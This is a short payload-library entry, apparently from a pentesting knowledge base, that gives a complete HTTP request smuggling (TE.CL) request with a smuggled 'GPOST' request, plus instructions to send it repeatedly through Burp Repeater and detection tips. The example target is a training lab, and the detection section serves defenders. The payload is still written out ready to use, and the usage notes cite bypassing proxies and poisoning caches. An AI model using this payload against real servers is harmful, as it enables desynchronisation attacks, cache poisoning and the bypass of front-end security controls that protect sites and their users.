---
type: code
language: http
verified: true
created_at: '2020-08-12T17:37:48.939277+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
tags:
  - http-request-smuggling
  - payload
platforms:
  - Web
validated: true
---

# HTTP-Request-Smuggling-TE-CL-Payload

## Code

```http
POST / HTTP/1.1
Host: $_TARGET_HOST
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0
```

## Description

This HTTP request payload exploits TE.CL request smuggling by using Transfer-Encoding: chunked for the front-end while specifying a short Content-Length. The chunked body contains a smuggled 'GPOST' request, causing desynchronization where the back-end processes it as a separate invalid request, leading to errors like 'Unrecognized method GPOST'.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_TARGET_HOST | The target server's hostname or lab ID | your-lab-id.web-security-academy.net |

## Usage

Paste this payload into Burp Suite Repeater or a similar tool after intercepting a legitimate POST request. Send it multiple times, then follow with a normal request to observe the back-end error. Used in web vulnerability testing to bypass proxies or poison caches. Related to procedure [[procedures/HTTP-Request-Smuggling-TE-CL]].

## Detection

- Monitor for requests with both Transfer-Encoding: chunked and Content-Length headers.
- Alert on chunked bodies containing full HTTP requests or invalid methods like 'GPOST'.
- WAF rules to reject ambiguous header combinations; server logs showing desynchronized methods.
